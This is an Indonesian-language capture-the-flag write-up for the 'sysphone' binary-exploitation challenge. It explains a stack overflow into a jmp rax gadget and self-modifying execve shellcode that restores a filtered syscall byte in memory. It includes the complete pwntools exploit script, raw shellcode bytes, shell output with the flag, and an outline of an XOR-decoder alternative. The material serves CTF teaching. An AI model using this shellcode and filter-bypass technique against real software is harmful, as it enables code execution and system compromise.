---

# Penjelasan kode panitia

```py
from pwn import *

context.arch = "amd64"

# p = process("./chall")
p = remote("ctf.compfest.id", "7003")
```

* Pakai **Pwntools** dan target **amd64**.
* Terkoneksi ke service remote `ctf.compfest.id:7003` (bisa juga lokal dengan `process`).

```py
# https://www.exploit-db.com/exploits/46907
shellcode = bytes.fromhex("4831F65648BF2F62696E2F2F736857545F6A3B584831D2990F05")
```

* Shellcode klasik `execve("/bin//sh")` (varian dari exploit-db 46907).
* Di ujungnya ada **`0F 05`** = instruksi `syscall` (wajib untuk `execve`).

```py
filtered_shellcode = shellcode[:-1] + b"\x00"
```

* Tantangan **mem-filter pasangan byte `0f 05`** saat input dibaca.
* Trik: **ubah byte terakhir `0x05 → 0x00`** saat dikirim, sehingga input **tidak** mengandung `0f 05`.
* Nanti byte `0x05` akan **dipulihkan kembali di memori** (self-modifying).

```py
retoverride = p64(0x000000000040116C)  # Gadget for: jmp rax
```

* Di biner ada gadget **`jmp rax`** (alamat fix karena **non-PIE**).
* Setelah fungsi baca (custom `fgets`) selesai, **RAX = alamat buffer**.
* Kita timpa **RET** → eksekusi gadget → **lompat ke buffer** (shellcode).

```py
# sub    rsp,0x110
allocate_rsp = bytes.fromhex("4881EC10010000")

# mov    WORD PTR [rsp+0x107],0x5
restore_shellcode = bytes.fromhex("66C78424070100000500")
```

* Self-modifying step:

  * `sub rsp, 0x110` → **memundurkan RSP** supaya **RSP = awal buffer** (detail di bawah).
  * `mov word [rsp+0x107], 0x0005` → **menulis kembali `0x05`** ke **byte terakhir** shellcode (yang tadi kita set `0x00`). Karena write-nya **word** (2 byte, `05 00`), byte `0x00` “tumpah” ke offset berikutnya (sudah area saved RBP filler—aman).

```py
BUFFER_SIZE = 0x108  # We will treat saved rbp as part of the buffer
NOP_LENGTH = (
    BUFFER_SIZE - len(allocate_rsp) - len(restore_shellcode) - len(filtered_shellcode)
)
payload = (
    b"1000\n"
    + asm("nop") * NOP_LENGTH
    + allocate_rsp
    + restore_shellcode
    + filtered_shellcode
    + retoverride
)
```

* **Buffer** ukuran `0x100`; di stack tepat setelahnya ada **saved RBP (8B)** → total **`0x108`** sudah melewati saved RBP, *tepat sebelum RET*. Di sini mereka **menganggap saved RBP bagian dari “ruang buffer”** untuk pemaketan.
* **Penjajaran (alignment) kunci**: mereka menghitung `NOP_LENGTH` sehingga:

  ```
  [NOP * N][sub rsp,0x110][mov word [rsp+0x107],0x0005][shellcode’]
  ^ awal buffer                                     ^ byte terakhir shellcode'
  ```

  Artinya **byte terakhir `filtered_shellcode`** tepat di offset **`0x107`** dari **awal buffer**.
  Setelah `sub rsp,0x110` → **RSP = awal buffer**, maka `mov word [rsp+0x107], 0x0005` akan menulis **`0x05`** ke byte itu — memulihkan **`… 0F 05`** **di memori**, bukan di input.
* Terakhir append `retoverride` untuk **mengganti RET** dengan alamat gadget `jmp rax`.
* Mereka menaruh `"1000\n"` di *depan payload*—ini “menjawab” prompt `length:` secara *nyampur* (bisa jalan, tapi lebih rapi biasanya kita kirim length dan data di panggilan terpisah).

```py
p.sendline(payload)
p.interactive()
```

* Kirim payload one-shot; masuk mode interaktif.
  Karena shellcode menjalankan `/bin/sh`, kamu bisa ketik `ls`, `cat flag.txt`, dll.

### Kenapa ini bekerja (urutan eksekusi)

1. Program baca **length** dan **data** ke buffer stack `[rbp-0x100]`.
2. Selesai baca, custom `fgets` **return** → **`RAX = ptr buffer`**.
3. Fungsi **`leave; ret`** → `RET` yang telah kita timpa → **alamat gadget `jmp rax`**.
4. Gadget men-**jump** ke alamat di RAX → start buffer → eksekusi:

   * `NOP …` (lewat)
   * `sub rsp, 0x110` → **RSP** jadi **awal buffer**,
   * `mov word [rsp+0x107], 0x5` → pulihkan `… 0F 05` tepat di **byte terakhir** shellcode,
   * lanjut ke **shellcode** (yang sekarang valid) → spawn `/bin/sh` → kamu `cat flag.txt`.

---

# Write-up: “sysphone” (Binary Exploitation)

## Ringkasan

* **Kategori**: pwn / binary exploitation
* **Vuln**: stack buffer overflow, custom read dengan filter byte `0f 05`
* **Mitigasi**: **NX off** (stack executable), **non-PIE** (alamat code fix)
* **Tujuan**: eksekusi shellcode / dapatkan flag
* **Trik inti**: **self-modifying shellcode** (pulihkan `syscall` di memori), atau **2-stage XOR decoder**

## Recon

* Binary 64-bit, **ET\_EXEC (non-PIE)** → alamat gadget fix.
* **NX off** → boleh eksekusi di stack.
* Fungsi rentan: baca **panjang** dari user, lalu **data** ke buffer stack 0x100, kemudian `leave; ret`.
* Custom `fgets` **mem-filter**: kalau input mengandung pasangan byte **`0f 05`** → program exit.
* Setelah `fgets` return, **`RAX` berisi pointer buffer**. Di `.text` ada gadget **`jmp rax`** di **`0x40116c`** (dan opsi lain `0x4011ae`).

## Strategi eksploit

1. **Overflow** hingga **RET** (offset `0x100 + 8 = 0x108`), isi **RET = 0x40116c** (`jmp rax`).

2. **Shellcode** harus **tanpa** pasangan `0f 05` di **INPUT**:

   * **Jalur A (intended / panitia)**: **self-modifying**

     * kirim shellcode `execve("/bin//sh")` tapi **ubah byte terakhir `0x05→0x00`**,
     * jalankan instruksi yang menulis kembali `0x05` **di memori** tepat pada lokasi byte terakhir shellcode,
     * lalu shellcode utuh berjalan.
   * **Jalur B (alternatif)**: **2-stage XOR**

     * stage-1 (tanpa syscall) meng-XOR stage-2 di memori, lalu lompat ke sana.

3. **Layout** (jalur A):

   ```
   [ NOP * N ]
   [ sub rsp, 0x110 ]                    ; RSP -> awal buffer
   [ mov word [rsp+0x107], 0x0005 ]      ; pulihkan byte terakhir syscall
   [ shellcode' (byte terakhir = 0x00) ] ; sekarang sudah valid di memori
   [ saved RBP filler (tercakup di N) ]
   [ RET = 0x40116c (jmp rax) ]
   ```

   `N` dihitung supaya **byte terakhir shellcode** tepat berada di **offset 0x107** dari **awal buffer**.

## Eksploit (kode panitia, worked)

```py
from pwn import *
context.arch = "amd64"
p = remote("ctf.compfest.id", "7003")

shellcode = bytes.fromhex("4831F65648BF2F62696E2F2F736857545F6A3B584831D2990F05")
filtered = shellcode[:-1] + b"\x00"             # hapus pasangan 0f 05 di input

jmp_rax = p64(0x40116C)                          # gadget: jmp rax (non-PIE)
alloc   = bytes.fromhex("4881EC10010000")        # sub rsp,0x110
restore = bytes.fromhex("66C78424070100000500")  # mov word [rsp+0x107],0x5

BUF = 0x108
NOPLEN = BUF - len(alloc) - len(restore) - len(filtered)

payload = b"1000\n" + asm("nop")*NOPLEN + alloc + restore + filtered + jmp_rax
p.sendline(payload)
p.interactive()
```

## Output

```
js overflow me gng
length: data: $ ls
chall
flag.txt
$ cat flag.txt
COMPFEST17{5H3lLc0d1n9_15_480U7_cR3471V17Y_29d3591b4c}
```

## Catatan & jebakan

* **Filter input** hanya saat **membaca** — aman jika `syscall` dibentuk **setelahnya** (di memori).
* Teknik self-modifying **sensitif offset**: `sub rsp,0x110` dan `[rsp+0x107]` harus pas.
* IO service biasanya minta **`length:` lalu `data:`**; kode panitia menyisipkan `"1000\n"` di payload (kerapihannya bisa ditingkatkan dengan `sendlineafter(...)` + `sendafter(...)`).
* Alternatif **paling robust**: 2-stage XOR decoder (tidak perlu mikir offset tumpul).

## Alternatif (2-stage XOR, ide singkat)

* **Stage-1** (tidak mengandung `0f 05`):
  `call $+5; pop rsi; add rsi,<offset>; mov ecx,L; mov al,key;` lalu loop `xor [rsi],al;` → `jmp rsi`.
* **Stage-2** (ter-XOR): syscall `write("OK\n")`, `open("/flag")`→`read`→`write`.
* Overflow sama: `[stage1+enc_stage2 (<=0x100)] [saved_rbp] [RET=jmp rax]`.
